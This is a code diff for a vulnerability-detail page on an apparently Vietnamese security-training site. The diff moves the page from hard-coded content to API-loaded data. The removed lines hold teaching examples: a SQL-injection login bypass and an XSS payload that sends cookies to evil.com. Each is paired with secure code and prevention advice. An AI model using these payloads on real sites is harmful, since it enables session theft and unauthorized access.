@@ -1,5 +1,7 @@
+'use client';
+
+import { useState, useEffect, use } from 'react';
 import Link from 'next/link';
-import { vulnerabilities, labs } from '@/lib/data';
 import { notFound } from 'next/navigation';
 import { 
   BookOpen, 
@@ -13,124 +15,69 @@ import {
   FlaskConical, 
   Clock, 
   Bookmark, 
-  ChevronRight 
+  ChevronRight,
+  AlertCircle
 } from 'lucide-react';
+import { api, Vulnerability, Lab } from '@/lib/api';
 import VulnIcon from '@/components/VulnIcon';
 
-// Chi tiết nội dung cho mỗi vulnerability
-const vulnDetails: Record<string, {
-  overview: string;
-  howItWorks: string;
-  exploitation: string;
-  codeExample: { language: string; vulnerable: string; secure: string };
-  prevention: string[];
-  references: string[];
-}> = {
-  'sql-injection': {
-    overview: 'SQL Injection (SQLi) là một trong những lỗ hổng bảo mật nghiêm trọng và phổ biến nhất trong ứng dụng web. Lỗ hổng này xảy ra khi ứng dụng web chèn trực tiếp dữ liệu đầu vào của người dùng vào câu truy vấn SQL mà không kiểm tra hoặc lọc (sanitize) đúng cách.',
-    howItWorks: 'Khi ứng dụng web xây dựng câu truy vấn SQL bằng cách nối chuỗi (string concatenation) với dữ liệu do người dùng cung cấp, kẻ tấn công có thể chèn thêm mã SQL độc hại vào câu truy vấn. Điều này cho phép kẻ tấn công:\n\n• Đọc dữ liệu nhạy cảm từ cơ sở dữ liệu\n• Sửa đổi hoặc xóa dữ liệu\n• Thực thi các thao tác quản trị trên cơ sở dữ liệu\n• Trong một số trường hợp, thực thi lệnh hệ điều hành',
-    exploitation: 'Có nhiều loại SQL Injection:\n\n1. **In-band SQLi**: Kết quả truy vấn được hiển thị trực tiếp trên trang web\n   - UNION-based: Sử dụng UNION SELECT để trích xuất dữ liệu\n   - Error-based: Lợi dụng thông báo lỗi SQL để trích xuất thông tin\n\n2. **Blind SQLi**: Không hiển thị trực tiếp kết quả\n   - Boolean-based: Phân tích phản hồi TRUE/FALSE\n   - Time-based: Sử dụng SLEEP() để xác nhận điều kiện\n\n3. **Out-of-band SQLi**: Sử dụng kênh truyền thông khác (DNS, HTTP)',
-    codeExample: {
-      language: 'java',
-      vulnerable: `// CODE LỖI - Dễ bị SQL Injection
-String query = "SELECT * FROM users WHERE username = '" 
-  + request.getParameter("username") 
-  + "' AND password = '" 
-  + request.getParameter("password") + "'";
-Statement stmt = connection.createStatement();
-ResultSet rs = stmt.executeQuery(query);
+export default function VulnerabilityDetailPage({ params }: { params: Promise<{ slug: string }> }) {
+  const { slug } = use(params);
+  
+  const [vuln, setVuln] = useState<Vulnerability | null>(null);
+  const [relatedLabs, setRelatedLabs] = useState<Lab[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
 
-// Kẻ tấn công nhập: username = admin' --
-// Query trở thành:
-// SELECT * FROM users WHERE username = 'admin' --' AND password = ''
-// Phần sau -- bị comment, bypass kiểm tra mật khẩu!`,
-      secure: `// CODE AN TOÀN - Sử dụng Prepared Statement
-String query = "SELECT * FROM users WHERE username = ? AND password = ?";
-PreparedStatement pstmt = connection.prepareStatement(query);
-pstmt.setString(1, request.getParameter("username"));
-pstmt.setString(2, request.getParameter("password"));
-ResultSet rs = pstmt.executeQuery();
+  useEffect(() => {
+    async function loadData() {
+      try {
+        const vulnRes = await api.vulnerabilities.getBySlug(slug);
+        if (vulnRes.success && vulnRes.data) {
+          setVuln(vulnRes.data);
+          
+          // Load related labs
+          const labsRes = await api.vulnerabilities.getLabs(vulnRes.data.id);
+          if (labsRes.success) {
+            setRelatedLabs(labsRes.data);
+          }
+        } else {
+          setError('Không tìm thấy thông tin lỗ hổng bảo mật.');
+        }
+      } catch (e: any) {
+        setError(e.message || 'Lỗi khi tải dữ liệu lỗ hổng.');
+      } finally {
+        setLoading(false);
+      }
+    }
 
-// Prepared Statement tự động escape các ký tự đặc biệt
-// Kẻ tấn công không thể thay đổi cấu trúc câu truy vấn`,
-    },
-    prevention: [
-      'Sử dụng Prepared Statements (Parameterized Queries) cho TẤT CẢ truy vấn SQL',
-      'Sử dụng ORM (Hibernate, JPA) thay vì viết SQL trực tiếp',
-      'Áp dụng nguyên tắc Least Privilege cho database user',
-      'Validate và sanitize tất cả input từ người dùng',
-      'Sử dụng WAF (Web Application Firewall) để phát hiện SQLi patterns',
-      'Không hiển thị lỗi SQL chi tiết cho người dùng cuối',
-    ],
-    references: [
-      'OWASP SQL Injection Prevention Cheat Sheet',
-      'CWE-89: SQL Injection',
-      'PortSwigger Web Security Academy - SQL Injection',
-    ],
-  },
-  'xss': {
-    overview: 'Cross-Site Scripting (XSS) là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript độc hại vào trang web mà người dùng khác sẽ nhìn thấy và trình duyệt sẽ thực thi. XSS cho phép kẻ tấn công đánh cắp session, cookie, hoặc thực hiện hành động thay mặt nạn nhân.',
-    howItWorks: 'XSS xảy ra khi ứng dụng web hiển thị dữ liệu đầu vào của người dùng mà không encode hoặc escape đúng cách. Trình duyệt không phân biệt được đâu là mã JavaScript hợp lệ của trang web và đâu là mã độc hại do kẻ tấn công chèn vào.',
-    exploitation: '1. **Reflected XSS**: Mã độc nằm trong URL/request và phản hồi lại ngay\n2. **Stored XSS**: Mã độc được lưu trong database và hiển thị cho mọi user\n3. **DOM-based XSS**: Mã độc được xử lý bởi JavaScript phía client',
-    codeExample: {
-      language: 'html',
-      vulnerable: `<!-- CODE LỖI - Input không được escape -->
-<div>
-  Kết quả tìm kiếm cho: <%= request.getParameter("q") %>
-</div>
+    loadData();
+  }, [slug]);
 
-<!-- Kẻ tấn công nhập: q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> -->
-<!-- Trình duyệt sẽ thực thi script và gửi cookie đến server của kẻ tấn công -->`,
-      secure: `<!-- CODE AN TOÀN - Sử dụng output encoding -->
-<div>
-  Kết quả tìm kiếm cho: \${fn:escapeXml(param.q)}
-</div>
-
-<!-- Hoặc trong React (tự động escape) -->
-<div>Kết quả tìm kiếm cho: {searchQuery}</div>
-
-<!-- React tự động escape HTML entities -->
-<!-- <script> sẽ thành &lt;script&gt; và KHÔNG được thực thi -->`,
-    },
-    prevention: [
-      'Output Encoding: Encode tất cả dữ liệu user trước khi render vào HTML',
-      'Content Security Policy (CSP): Giới hạn nguồn script được phép thực thi',
-      'HttpOnly cookie flag: Ngăn JavaScript truy cập session cookie',
-      'Sử dụng framework hiện đại (React, Vue) tự động escape output',
-      'Input validation: Whitelist các ký tự được phép',
-      'Sanitize HTML input nếu cần cho phép rich text (dùng thư viện như DOMPurify)',
-    ],
-    references: [
-      'OWASP XSS Prevention Cheat Sheet',
-      'CWE-79: Cross-site Scripting',
-      'PortSwigger - Cross-site scripting',
-    ],
-  },
-};
-
-// Fallback cho các vulnerability chưa có chi tiết
-const defaultDetail = {
-  overview: 'Nội dung chi tiết đang được cập nhật. Vui lòng quay lại sau.',
-  howItWorks: 'Đang cập nhật...',
-  exploitation: 'Đang cập nhật...',
-  codeExample: { language: 'text', vulnerable: '// Đang cập nhật...', secure: '// Đang cập nhật...' },
-  prevention: ['Đang cập nhật...'],
-  references: ['Đang cập nhật...'],
-};
-
-export default async function VulnerabilityDetailPage({ params }: { params: Promise<{ slug: string }> }) {
-  const { slug } = await params;
-  const vuln = vulnerabilities.find(v => v.slug === slug);
-
-  if (!vuln) {
-    notFound();
+  if (loading) {
+    return <div style={{ textAlign: 'center', padding: 'var(--space-6)' }}>Đang tải thông tin...</div>;
   }
 
-  const detail = vulnDetails[slug] || defaultDetail;
-  const relatedLabs = labs.filter(l => l.vulnerabilitySlug === slug);
+  if (error || !vuln) {
+    return (
+      <div className="card" style={{ textAlign: 'center', padding: 'var(--space-6)' }}>
+        <AlertCircle size={48} style={{ color: 'var(--fg-danger)', margin: '0 auto var(--space-2)' }} />
+        <h3>Lỗi dữ liệu</h3>
+        <p style={{ margin: 'var(--space-1) auto' }}>{error || 'Không tìm thấy thông tin lỗ hổng.'}</p>
+        <Link href="/vulnerabilities" className="btn btn-secondary" style={{ display: 'inline-flex', marginTop: 'var(--space-2)' }}>
+          Quay lại danh sách lỗ hổng
+        </Link>
+      </div>
+    );
+  }
+
   const severityClass = vuln.severity === 'CRITICAL' ? 'badge-critical' : 
                         vuln.severity === 'HIGH' ? 'badge-high' : 
                         vuln.severity === 'MEDIUM' ? 'badge-medium' : 'badge-low';
+
+  const severityLabel = vuln.severity === 'CRITICAL' ? 'Cực kỳ nghiêm trọng' :
+                        vuln.severity === 'HIGH' ? 'Cao' :
+                        vuln.severity === 'MEDIUM' ? 'Trung bình' : 'Thấp';
 
   return (
     <div>
@@ -150,9 +97,9 @@ export default async function VulnerabilityDetailPage({ params }: { params: Prom
           <div>
             <h1 style={{ fontSize: '2rem', fontWeight: 800, margin: 0 }}>{vuln.name}</h1>
             <div style={{ display: 'flex', gap: 'var(--space-2)', marginTop: '4px' }}>
-              <span className={`badge ${severityClass}`}>{vuln.severity}</span>
+              <span className={`badge ${severityClass}`}>{severityLabel}</span>
               <span style={{ fontSize: '0.875rem', color: 'var(--text-body-subtle)' }}>
-                {vuln.labCount} bài lab thực hành
+                {relatedLabs.length} bài lab thực hành
               </span>
             </div>
           </div>
@@ -168,72 +115,32 @@ export default async function VulnerabilityDetailPage({ params }: { params: Prom
             <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
               <BookOpen size={18} style={{ color: 'var(--fg-brand)' }} /> Tổng quan
             </h3>
-            <p style={{ lineHeight: 1.8 }}>{detail.overview}</p>
-          </div>
-
-          {/* How it works */}
-          <div className="card animate-fade-in-up animate-delay-2" style={{ marginBottom: 'var(--space-3)' }}>
-            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
-              <Settings size={18} style={{ color: 'var(--fg-brand)' }} /> Cách hoạt động
-            </h3>
-            <p style={{ lineHeight: 1.8, whiteSpace: 'pre-line' }}>{detail.howItWorks}</p>
+            <p style={{ lineHeight: 1.8 }}>{vuln.description}</p>
           </div>
 
           {/* Exploitation */}
-          <div className="card animate-fade-in-up animate-delay-3" style={{ marginBottom: 'var(--space-3)' }}>
-            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
-              <Unlock size={18} style={{ color: 'var(--fg-brand)' }} /> Khai thác
-            </h3>
-            <p style={{ lineHeight: 1.8, whiteSpace: 'pre-line' }}>{detail.exploitation}</p>
-          </div>
-
-          {/* Code Examples */}
-          <div className="animate-fade-in-up animate-delay-4" style={{ marginBottom: 'var(--space-3)' }}>
-            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
-              <Code size={18} style={{ color: 'var(--fg-brand)' }} /> Ví dụ Code
-            </h3>
-            
-            {/* Vulnerable Code */}
-            <div className="code-block" style={{ marginBottom: 'var(--space-2)' }}>
-              <div className="code-block-header">
-                <span className="code-block-lang" style={{ color: 'var(--fg-danger)', display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
-                  <AlertTriangle size={14} /> Code lỗ hổng - {detail.codeExample.language}
-                </span>
+          {vuln.exploitationGuide && (
+            <div className="card animate-fade-in-up animate-delay-2" style={{ marginBottom: 'var(--space-3)' }}>
+              <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
+                <Unlock size={18} style={{ color: 'var(--fg-brand)' }} /> Phương pháp khai thác
+              </h3>
+              <div style={{ lineHeight: 1.8, whiteSpace: 'pre-line', fontSize: '14px', fontFamily: 'var(--font-sans)' }}>
+                {vuln.exploitationGuide}
               </div>
-              <pre style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
-                {detail.codeExample.vulnerable}
-              </pre>
             </div>
-
-            {/* Secure Code */}
-            <div className="code-block">
-              <div className="code-block-header">
-                <span className="code-block-lang" style={{ color: 'var(--fg-success-strong)', display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
-                  <CheckCircle2 size={14} /> Code an toàn - {detail.codeExample.language}
-                </span>
-              </div>
-              <pre style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
-                {detail.codeExample.secure}
-              </pre>
-            </div>
-          </div>
+          )}
 
           {/* Prevention */}
-          <div className="card animate-fade-in-up animate-delay-5" style={{ marginBottom: 'var(--space-3)' }}>
-            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
-              <ShieldAlert size={18} style={{ color: 'var(--fg-brand)' }} /> Cách phòng chống
-            </h3>
-            <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '12px', paddingLeft: 0 }}>
-              {detail.prevention.map((item, i) => (
-                <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: '8px', color: 'var(--text-body)' }}>
-                  <span style={{ color: 'var(--fg-success-strong)', flexShrink: 0, display: 'flex', alignItems: 'center', paddingTop: '3px' }}>
-                    <Check size={14} />
-                  </span>
-                  <span>{item}</span>
-                </li>
-              ))}
-            </ul>
-          </div>
+          {vuln.preventionGuide && (
+            <div className="card animate-fade-in-up animate-delay-3" style={{ marginBottom: 'var(--space-3)' }}>
+              <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
+                <ShieldAlert size={18} style={{ color: 'var(--fg-brand)' }} /> Phương pháp phòng chống
+              </h3>
+              <div style={{ lineHeight: 1.8, whiteSpace: 'pre-line', fontSize: '14px', fontFamily: 'var(--font-sans)' }}>
+                {vuln.preventionGuide}
+              </div>
+            </div>
+          )}
         </div>
 
         {/* Sidebar */}
@@ -246,9 +153,12 @@ export default async function VulnerabilityDetailPage({ params }: { params: Prom
             {relatedLabs.length > 0 ? (
               <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--space-1)' }}>
                 {relatedLabs.map((lab) => {
-                  const diffClass = lab.difficulty === 'EASY' ? 'badge-easy' : 
-                                    lab.difficulty === 'MEDIUM' ? 'badge-medium-diff' : 
-                                    lab.difficulty === 'HARD' ? 'badge-hard' : 'badge-expert';
+                  const diffClass = lab.difficulty === 'BEGINNER' ? 'badge-easy' : 
+                                    lab.difficulty === 'INTERMEDIATE' ? 'badge-medium-diff' : 
+                                    'badge-hard';
+                  
+                  const difficultyLabel = lab.difficulty === 'BEGINNER' ? 'Dễ' :
+                                          lab.difficulty === 'INTERMEDIATE' ? 'Trung bình' : 'Khó';
                   return (
                     <Link key={lab.id} href={`/labs/${lab.id}`} style={{ textDecoration: 'none' }}>
                       <div style={{
@@ -260,7 +170,7 @@ export default async function VulnerabilityDetailPage({ params }: { params: Prom
                         cursor: 'pointer',
                       }}>
                         <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
-                          <span className={`badge ${diffClass}`} style={{ fontSize: '0.6875rem' }}>{lab.difficulty}</span>
+                          <span className={`badge ${diffClass}`} style={{ fontSize: '0.6875rem' }}>{difficultyLabel}</span>
                           <span style={{ fontSize: '0.75rem', color: 'var(--text-body-subtle)' }}>{lab.points} pts</span>
                         </div>
                         <div style={{ fontSize: '0.875rem', fontWeight: 600, color: 'var(--text-heading)' }}>{lab.title}</div>
@@ -277,20 +187,6 @@ export default async function VulnerabilityDetailPage({ params }: { params: Prom
                 Chưa có bài lab cho lỗ hổng này.
               </p>
             )}
-          </div>
-
-          {/* References */}
-          <div className="card animate-fade-in-up animate-delay-3">
-            <h3 style={{ marginBottom: 'var(--space-2)', fontSize: '1.125rem', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
-              <Bookmark size={18} style={{ color: 'var(--fg-brand)' }} /> Tham khảo
-            </h3>
-            <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '8px', paddingLeft: 0 }}>
-              {detail.references.map((ref, i) => (
-                <li key={i} style={{ fontSize: '0.8125rem', color: 'var(--fg-brand)', display: 'flex', alignItems: 'center', gap: '4px' }}>
-                  <ChevronRight size={12} /> {ref}
-                </li>
-              ))}
-            </ul>
           </div>
         </div>
       </div>
